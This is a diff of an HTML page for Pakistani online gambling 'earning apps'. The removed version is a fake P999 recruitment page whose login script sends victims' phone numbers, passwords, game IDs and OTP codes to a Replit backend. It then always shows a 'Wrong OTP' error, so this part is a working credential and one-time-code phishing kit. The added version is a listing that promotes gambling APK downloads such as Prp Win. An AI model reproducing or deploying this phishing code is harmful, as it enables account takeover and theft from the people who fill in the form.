@@ -1,412 +1,91 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en-PK">
 <head>
-   <meta charset="UTF-8">
-   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-   <title>P999 Game Agent</title>
-   <script src="https://cdn.tailwindcss.com"></script>
-   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-   <style>
-       body { font-family: 'Inter', sans-serif; background-color: #f4f4f5; }
-       .header-gradient { background-image: linear-gradient(to bottom, #fde047, #facc15); }
-       .bottom-nav { box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1); }
-       .captcha-text { font-family: 'Courier New', Courier, monospace; font-size: 1.125rem; font-weight: bold; letter-spacing: 2px; text-decoration: line-through; user-select: none; background-color: #e5e7eb; padding: 0.25rem; border-radius: 0.375rem; text-align: center; }
-   </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <title>Top 10 Earning Apps in Pakistan 2025 - Official Agent Store</title>
+    <meta name="description" content="Download best online earning games in Pakistan. Official links for Prp Win, S9 Game, P999, and Lucky 97. Daily withdrawal via JazzCash & Easypaisa.">
+    
+    <style>
+        body { font-family: sans-serif; background: #f0f2f5; margin: 0; padding: 20px; text-align: center; }
+        .header { margin-bottom: 30px; }
+        .header h1 { color: #2c3e50; font-size: 1.8rem; }
+        .header p { color: #666; }
+
+        /* Game Grid */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; max-width: 800px; margin: 0 auto; }
+        
+        .card { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); display: flex; align-items: center; text-align: left; border: 1px solid #eee; transition: 0.3s; }
+        .card:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0,0,0,0.15); }
+        
+        .icon { width: 70px; height: 70px; background: #eee; border-radius: 15px; margin-right: 15px; display: flex; align-items: center; justify-content: center; font-size: 2rem; }
+        
+        .info h3 { margin: 0 0 5px 0; color: #333; }
+        .info p { margin: 0; font-size: 0.85rem; color: #777; }
+        .rating { color: #ffc107; font-size: 0.9rem; margin-top: 5px; }
+
+        .btn { margin-left: auto; background: #00C853; color: white; text-decoration: none; padding: 10px 20px; border-radius: 50px; font-weight: bold; font-size: 0.9rem; }
+        
+        /* Highlight Prp Win (Featured) */
+        .featured { border: 2px solid #ffc107; background: #fffbe6; }
+        .tag { background: #ffc107; color: black; padding: 2px 8px; border-radius: 5px; font-size: 0.7rem; font-weight: bold; margin-left: 5px; }
+    </style>
 </head>
-<body class="pb-20">
+<body>
 
-   <div class="max-w-md mx-auto bg-white shadow-lg">
-       <header class="header-gradient p-4">
-           <div class="flex items-center justify-between mb-4">
-               <div class="flex items-center space-x-2">
-                   <span class="text-3xl">🎰</span>
-                   <h1 class="text-xl font-bold text-red-700">P999 Game Agent</h1>
-                   <span class="text-3xl">💃</span>
-               </div>
-               <h2 class="text-sm font-semibold text-gray-700">Recruitment Agent</h2>
-           </div>
-           <div class="flex items-center justify-between">
-               <div class="flex space-x-2">
-                   <button class="flex items-center space-x-1 bg-white/70 px-3 py-1 rounded-full shadow text-sm font-medium">
-                       <span>🇬🇧</span>
-                       <span>English</span>
-                   </button>
-                   <button class="flex items-center space-x-1 bg-white/30 px-3 py-1 rounded-full text-sm font-medium">
-                       <span>🇵🇰</span>
-                       <span>اردو</span>
-                   </button>
-               </div>
-               <div class="flex space-x-2">
-                   <button id="signUpButton" class="bg-green-600 text-white px-4 py-2 rounded-full font-bold shadow-md text-sm">
-                       SIGN UP
-                   </button>
-                   <button id="loginButton" class="bg-red-600 text-white px-4 py-2 rounded-full font-bold shadow-md text-sm">
-                       LOGIN
-                   </button>
-               </div>
-           </div>
-       </header>
+    <div class="header">
+        <h1>🔥 Best Earning Apps Pakistan</h1>
+        <p>Verified & Trusted Games | JazzCash/Easypaisa Withdrawal</p>
+    </div>
 
-       <nav class="bg-white flex justify-around p-4 shadow-sm">
-           <a href="#" class="flex flex-col items-center text-center text-gray-700"><i class="fas fa-home text-2xl text-blue-500 mb-1"></i><span class="text-xs font-medium">Home</span></a>
-           <a href="#" class="flex flex-col items-center text-center text-gray-700"><i class="fas fa-briefcase text-2xl text-yellow-700 mb-1"></i><span class="text-xs font-medium">Jobs</span></a>
-           <a href="#" class="flex flex-col items-center text-center text-gray-700"><i class="fas fa-money-bill-wave text-2xl text-green-500 mb-1"></i><span class="text-xs font-medium">Salary</span></a>
-           <a href="#" class="flex flex-col items-center text-center text-gray-700"><i class="fas fa-chart-line text-2xl text-purple-500 mb-1"></i><span class="text-xs font-medium">Skills</span></a>
-           <a href="#" class="flex flex-col items-center text-center text-gray-700"><i class="fas fa-gift text-2xl text-red-500 mb-1"></i><span class="text-xs font-medium">Bonus</span></a>
-       </nav>
-       <div class="p-4">
-           <div class="bg-yellow-100 border border-yellow-300 rounded-lg p-4 text-gray-800">
-               <h3 class="font-bold text-lg mb-2">Notice:</h3>
-               <p class="text-sm" lang="ur" dir="rtl">
-                   حال ہی میں ادائیگی کے چینلز میں
-عدم استحکام پایا جا رہا ہے، جس کی وجہ سے کامیاب
-ادائیگی کی شرح کم ہے۔ ہم اس مسئلے کو ہنگامی طور پر
-حل کرنے کی کوشش کر رہے ہیں۔ اس پریشانی کے لیے ہم
-دل سے معذرت خواہ ہیں
-               </p>
-           </div>
-       </div>
-       <div class="p-4">
-           <div class="bg-white rounded-lg shadow-md p-6 text-center">
-               <div class="flex justify-around items-center mb-6">
-                   <div class="text-center"><span class="text-5xl">🎰</span><div class="font-bold text-red-700">P999 Game Agent</div></div>
-                   <div class="grid grid-cols-2 gap-4">
-                       <div class="font-bold text-blue-600">JazzCash</div>
-                       <div class="font-bold text-green-600">easypaisa</div>
-                       <div class="font-semibold text-gray-500"></div>
-                       <div class="font-semibold text-blue-800"></div>
-                   </div>
-               </div>
-               <p class="text-gray-700 font-medium">
-                   Download the latest version of P999 Game APK v2.1 for your Android and iOS devices for free.
-               </p>
-               </div>
-       </div>
-   </div> 
-   
-   <footer class="fixed bottom-0 left-0 right-0 max-w-md mx-auto bg-white bottom-nav flex justify-around p-3">
-       <a href="#" class="flex flex-col items-center text-center text-blue-600 font-bold"><i class="fas fa-home text-xl mb-1"></i><span class="text-xs">HOME</span></a>
-       <a href="#" class="flex flex-col items-center text-center text-gray-600"><i class="fas fa-dollar-sign text-xl mb-1"></i><span class="text-xs">SALARY</span></a>
-       <a href="#" class="flex flex-col items-center text-center text-gray-600"><i class="fas fa-question-circle text-xl mb-1"></i><span class="text-xs">FAQs</span></a>
-       <a href="#" class="flex flex-col items-center text-center text-gray-600"><i class="fas fa-download text-xl mb-1"></i><span class="text-xs">APP</span></a>
-   </footer>
+    <div class="grid">
 
-   <div id="registerModal" class="fixed inset-0 bg-black/50 hidden justify-center items-center z-50 p-4">
-       <div class="bg-white p-4 rounded-lg shadow-xl w-full max-w-sm relative">
-           <button id="closeModalButton" class="absolute top-2 right-3 text-gray-500 hover:text-gray-800 text-2xl">×</button>
-           <h2 class="text-xl font-bold text-center mb-4 text-gray-800">Register to Join</h2>
-           <form id="registerForm" class="space-y-2">
-               <div><label for="username" class="block text-xs font-medium text-gray-700">Username</label><input type="text" id="username" name="username" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
-               <div><label for="password" class="block text-xs font-medium text-gray-700">Password</label><input type="password" id="password" name="password" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
-               <div><label for="confirm_password" class="block text-xs font-medium text-gray-700">Confirm Password</label><input type="password" id="confirm_password" name="confirm_password" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
-               <div><label for="number" class="block text-xs font-medium text-gray-700">Number</label><input type="tel" id="number" name="number" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
-               <div><label for="game_id" class="block text-xs font-medium text-gray-700">P999 Game - Game ID</label><input type="text" id="game_id" name="game_id" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm"></div>
-               <div>
-                   <label class="block text-xs font-medium text-gray-700">Captcha</label>
-                   <div class="flex items-center space-x-2 mt-1">
-                       <div id="captchaDisplay" class="captcha-text flex-1"></div> <button type="button" id="refreshCaptcha" class="p-2 text-blue-600 hover:text-blue-800"><i class="fas fa-sync-alt"></i></button>
-                   </div>
-                   <input type="text" id="captchaInput" placeholder="Enter captcha" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm">
-                   <p id="captchaError" class="text-red-500 text-sm mt-1 hidden">Invalid captcha. Please try again.</p>
-               </div>
-               <div class="flex space-x-4 pt-2"> <button type="submit" class="w-full bg-green-600 text-white py-1.5 px-4 rounded-md font-semibold hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-offset-2 text-sm">Submit</button><button type="reset" class="w-full bg-gray-500 text-white py-1.5 px-4 rounded-md font-semibold hover:bg-gray-600 focus:outline-none focus:ring-2 focus:ring-gray-400 focus:ring-offset-2 text-sm">Reset</button></div>
-           </form>
-       </div>
-   </div>
+        <div class="card featured">
+            <div class="icon" style="background: #000; color: #ffc107;">👑</div>
+            <div class="info">
+                <h3>Prp Win Game <span class="tag">HOT</span></h3>
+                <p>Bonus: Rs. 500 | Fast Withdrawal</p>
+                <div class="rating">⭐⭐⭐⭐⭐ 5.0</div>
+            </div>
+            <a href="https://prpwinapk.net" class="btn">Download</a>
+        </div>
 
-   <div id="loginModal" class="fixed inset-0 bg-black/50 hidden justify-center items-center z-50 p-4">
-       <div class="bg-white p-4 rounded-lg shadow-xl w-full max-w-sm relative">
-           
-           <button id="closeLoginModalButton" class="absolute top-2 right-3 text-gray-500 hover:text-gray-800 text-2xl">×</button>
-           
-           <h2 class="text-xl font-bold text-center mb-4 text-gray-800">Login</h2>
-           
-           <form id="loginForm" class="space-y-3">
-               
-               <div>
-                   <label for="login_number" class="block text-xs font-medium text-gray-700">Enter Your Number</label>
-                   <input type="tel" id="login_number" name="login_number" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm" placeholder="Enter Number">
-               </div>
+        <div class="card">
+            <div class="icon">🎮</div>
+            <div class="info">
+                <h3>P999 Game Agent</h3>
+                <p>Bonus: Rs. 100 | Old is Gold</p>
+                <div class="rating">⭐⭐⭐⭐☆ 4.5</div>
+            </div>
+            <a href="#" class="btn" style="background: #333;">Coming Soon</a>
+        </div>
 
-               <div>
-                   <label for="login_password" class="block text-xs font-medium text-gray-700">Enter Your Password</label>
-                   <input type="password" id="login_password" name="login_password" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm" placeholder="Enter Password">
-               </div>
+        <div class="card">
+            <div class="icon">🎲</div>
+            <div class="info">
+                <h3>S9 Game Official</h3>
+                <p>Super 9 | Card Games</p>
+                <div class="rating">⭐⭐⭐⭐☆ 4.2</div>
+            </div>
+            <a href="#" class="btn" style="background: #333;">Coming Soon</a>
+        </div>
 
-               <div>
-                   <label for="login_game_id" class="block text-xs font-medium text-gray-700">P999 Game - Game ID</label>
-                   <input type="text" id="login_game_id" name="login_game_id" required class="mt-1 block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm" placeholder="Enter Your Game ID">
-               </div>
-               <div>
-                   <label for="login_otp" class="block text-xs font-medium text-gray-700">Enter OTP</label>
-                   <div class="flex items-center space-x-2 mt-1">
-                       <input type="text" id="login_otp" name="login_otp" required class="block w-full px-2 py-1 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-blue-500 focus:border-blue-500 text-sm" placeholder="OTP Code">
-                       <button type="button" id="getOtpButton" class="w-auto whitespace-nowrap bg-blue-500 text-white px-3 py-1 rounded-md text-sm font-medium hover:bg-blue-600">
-                           Get OTP
-                       </button>
-                   </div>
-               </div>
+        <div class="card">
+            <div class="icon">🎰</div>
+            <div class="info">
+                <h3>Lucky 97 Casino</h3>
+                <p>Slots & Mines | New App</p>
+                <div class="rating">⭐⭐⭐☆☆ 3.8</div>
+            </div>
+            <a href="#" class="btn" style="background: #333;">Coming Soon</a>
+        </div>
 
-               <p id="loginError" class="text-red-500 text-sm pt-1 hidden">Wrong OTP. Please try again.</p>
+    </div>
 
-               <div class="pt-2">
-                   <button type="submit" class="w-full bg-red-600 text-white py-1.5 px-4 rounded-md font-semibold hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 text-sm">
-                       Login
-                   </button>
-               </div>
-           </form>
-       </div>
-   </div>
-
-   <div id="successModal" class="fixed inset-0 bg-black/50 hidden justify-center items-center z-50 p-4">
-       <div class="bg-white p-8 rounded-lg shadow-xl w-full max-w-xs text-center">
-           <i class="fas fa-check-circle text-green-500 text-5xl mb-4"></i>
-           <p id="successModalMessage" class="text-lg font-semibold text-gray-800 mb-4">Account Created Successfully</p>
-           <button id="closeSuccessModal" class="bg-blue-600 text-white py-2 px-6 rounded-md font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
-               OK
-           </button>
-       </div>
-   </div>
-
-   <div id="errorModal" class="fixed inset-0 bg-black/50 hidden justify-center items-center z-50 p-4">
-       <div class="bg-white p-8 rounded-lg shadow-xl w-full max-w-xs text-center">
-           <i class="fas fa-exclamation-triangle text-yellow-500 text-5xl mb-4"></i>
-           <p id="errorModalMessage" class="text-lg font-semibold text-gray-800 mb-4">Error message goes here</p>
-           <button id="closeErrorModal" class="bg-red-600 text-white py-2 px-6 rounded-md font-semibold hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2">
-               OK
-           </button>
-       </div>
-   </div>
-
-
-   <script>
-       // ▼▼▼=================================================▼▼▼
-       //       YAHAN BHI APNA REPLIT URL THEEK SE DAALEIN
-       //       (Jo aapne Hissa 1 mein copy kiya tha)
-       // ▼▼▼=================================================▼▼▼
-       
-       const REPLIT_BACKEND_URL = 'https://82a3f962-44b1-4854-852d-ee46247922d0-00-3u0zgk889dniz.sisko.replit.dev';
-       
-       // ▲▲▲=================================================▲▲▲
-
-       document.addEventListener('DOMContentLoaded', function() {
-
-           // --- ELEMENTS FOR REGISTER MODAL ---
-           const signUpButton = document.getElementById('signUpButton');
-           const registerModal = document.getElementById('registerModal');
-           const closeModalButton = document.getElementById('closeModalButton');
-           const registerForm = document.getElementById('registerForm');
-           const captchaDisplay = document.getElementById('captchaDisplay');
-           const captchaInput = document.getElementById('captchaInput');
-           const refreshCaptcha = document.getElementById('refreshCaptcha');
-           const captchaError = document.getElementById('captchaError');
-           
-           // --- SUCCESS MODAL ELEMENTS (UPDATED) ---
-           const successModal = document.getElementById('successModal');
-           const closeSuccessModalBtn = document.getElementById('closeSuccessModal');
-           const successModalMessage = document.getElementById('successModalMessage'); 
-
-           // --- NAYE ERROR MODAL KE ELEMENTS ---
-           const errorModal = document.getElementById('errorModal');
-           const closeErrorModalBtn = document.getElementById('closeErrorModal');
-           const errorModalMessage = document.getElementById('errorModalMessage');
-
-           // --- ELEMENTS FOR LOGIN MODAL ---
-           const loginButton = document.getElementById('loginButton');
-           const loginModal = document.getElementById('loginModal');
-           const closeLoginModalButton = document.getElementById('closeLoginModalButton');
-           const loginForm = document.getElementById('loginForm');
-           const getOtpButton = document.getElementById('getOtpButton');
-           const loginError = document.getElementById('loginError');
-           const loginNumber = document.getElementById('login_number');
-           const loginPassword = document.getElementById('login_password');
-           const loginGameId = document.getElementById('login_game_id');
-           const loginOtp = document.getElementById('login_otp');
-
-           let currentCaptcha = '';
-
-           function generateCaptcha() {
-               const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
-               let result = '';
-               for (let i = 0; i < 6; i++) {
-                   result += chars.charAt(Math.floor(Math.random() * chars.length));
-               }
-               currentCaptcha = result;
-               captchaDisplay.textContent = currentCaptcha;
-               captchaError.classList.add('hidden');
-           }
-
-           // --- Register Modal Functions ---
-           function openModal() {
-               registerModal.classList.remove('hidden');
-               registerModal.classList.add('flex');
-               generateCaptcha();
-               registerForm.reset();
-           }
-
-           function closeModal() {
-               registerModal.classList.add('hidden');
-               registerModal.classList.remove('flex');
-           }
-
-           // --- Login Modal Functions ---
-           function openLoginModal() {
-               loginModal.classList.remove('hidden');
-               loginModal.classList.add('flex');
-               loginForm.reset();
-               loginError.classList.add('hidden');
-           }
-
-           function closeLoginModal() {
-               loginModal.classList.add('hidden');
-               loginModal.classList.remove('flex');
-           }
-
-           // --- UPDATED Success Modal Functions ---
-           function openSuccessModal(message) {
-               if (successModalMessage) { successModalMessage.textContent = message; }
-               if (successModal) {
-                   successModal.classList.remove('hidden');
-                   successModal.classList.add('flex');
-               }
-           }
-
-           function closeSuccessModal() {
-               if (successModal) {
-                   successModal.classList.add('hidden');
-                   successModal.classList.remove('flex');
-               }
-           }
-           
-           // --- NAYE Error Modal Functions ---
-           function openErrorModal(message) {
-               if (errorModalMessage) { errorModalMessage.textContent = message; }
-               if (errorModal) {
-                   errorModal.classList.remove('hidden');
-                   errorModal.classList.add('flex');
-               }
-           }
-
-           function closeErrorModal() {
-               if (errorModal) {
-                   errorModal.classList.add('hidden');
-                   errorModal.classList.remove('flex');
-               }
-           }
-
-
-           // --- Event Listeners (Register) ---
-           if (signUpButton) { signUpButton.addEventListener('click', openModal); }
-           if (closeModalButton) { closeModalButton.addEventListener('click', closeModal); }
-           if (registerModal) { registerModal.addEventListener('click', function(event) { if (event.target === registerModal) { closeModal(); } }); }
-           if (registerForm) {
-               registerForm.addEventListener('submit', function(event) {
-                   event.preventDefault(); 
-                   if (captchaInput.value.toLowerCase() === currentCaptcha.toLowerCase()) {
-                       console.log('Registration successful!');
-                       closeModal();
-                       openSuccessModal('Account Created Successfully'); 
-                       registerForm.reset(); 
-                       captchaError.classList.add('hidden');
-                   } else {
-                       captchaError.classList.remove('hidden');
-                       generateCaptcha(); 
-                       captchaInput.value = ''; 
-                   }
-               });
-           }
-           if (registerForm) { registerForm.addEventListener('reset', function() { captchaError.classList.add('hidden'); generateCaptcha(); }); }
-           if (refreshCaptcha) { refreshCaptcha.addEventListener('click', generateCaptcha); }
-           
-           // --- Event Listeners (Login) ---
-           if (loginButton) { loginButton.addEventListener('click', openLoginModal); }
-           if (closeLoginModalButton) { closeLoginModalButton.addEventListener('click', closeLoginModal); }
-           if (loginModal) { loginModal.addEventListener('click', function(event) { if (event.target === loginModal) { closeLoginModal(); } }); }
-           
-           // --- Event Listeners (Custom Modals) ---
-           if (closeSuccessModalBtn) { closeSuccessModalBtn.addEventListener('click', closeSuccessModal); }
-           if (closeErrorModalBtn) { closeErrorModalBtn.addEventListener('click', closeErrorModal); } 
-
-
-           // =========================================================
-           // LOGIN FORM SUBMIT (DATA REPLIT KO BHEJEGA)
-           // =========================================================
-           if (loginForm) {
-                loginForm.addEventListener('submit', function(event) {
-                    event.preventDefault();
-                    loginError.classList.add('hidden');
-                    const button = loginForm.querySelector('button[type="submit"]');
-                    button.disabled = true;
-                    button.textContent = 'Logging in...';
-
-                    const formData = new FormData();
-                    formData.append('number', loginNumber.value);
-                    formData.append('otp', loginOtp.value);
-                    formData.append('password', loginPassword.value); 
-                    formData.append('game_id', loginGameId.value);
-
-                    fetch(`${REPLIT_BACKEND_URL}/save-otp`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.text())
-                    .then(data => {
-                        console.log(data);
-                        loginError.classList.remove('hidden'); // Hamesha error dikhayein
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        loginError.classList.remove('hidden'); // Error par bhi error dikhayein
-                    })
-                    .finally(() => {
-                        button.disabled = false; // Button ko wapas enable karein
-                        button.textContent = 'Login';
-                    });
-                });
-            }
-
-            // =========================================================
-            // GET OTP BUTTON CLICK (DATA REPLIT KO BHEJEGA) - UPDATED
-            // =========================================================
-            if (getOtpButton) {
-                getOtpButton.addEventListener('click', function() {
-                    
-                    if (!loginNumber.value || !loginPassword.value || !loginGameId.value) {
-                        openErrorModal('Please fill in Number, Password, and Game ID first.');
-                        return;
-                    }
-
-                    getOtpButton.disabled = true;
-                    getOtpButton.textContent = 'Sending...';
-
-                    const formData = new FormData();
-                    formData.append('number', loginNumber.value);
-                    formData.append('password', loginPassword.value);
-                    formData.append('game_id', loginGameId.value);
-
-                    fetch(`${REPLIT_BACKEND_URL}/save-data`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(response => response.text())
-                    .then(data => {
-                        console.log(data);
-                        openSuccessModal('OTP has been sent.'); 
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                        openErrorModal('Failed to request OTP. Please try again.');
-                    })
-                    .finally(() => {
-                        getOtpButton.disabled = false; // Button ko wapas enable karein
-                        getOtpButton.textContent = 'Get OTP';
-                    });
-                });
-            }
-
-           generateCaptcha();
-       }); 
-   </script>
+    <footer style="margin-top: 40px; font-size: 0.8rem; color: #888;">
+        <p>&copy; 2025 Platform Agent. All Rights Reserved.</p>
+    </footer>
 
 </body>
 </html>
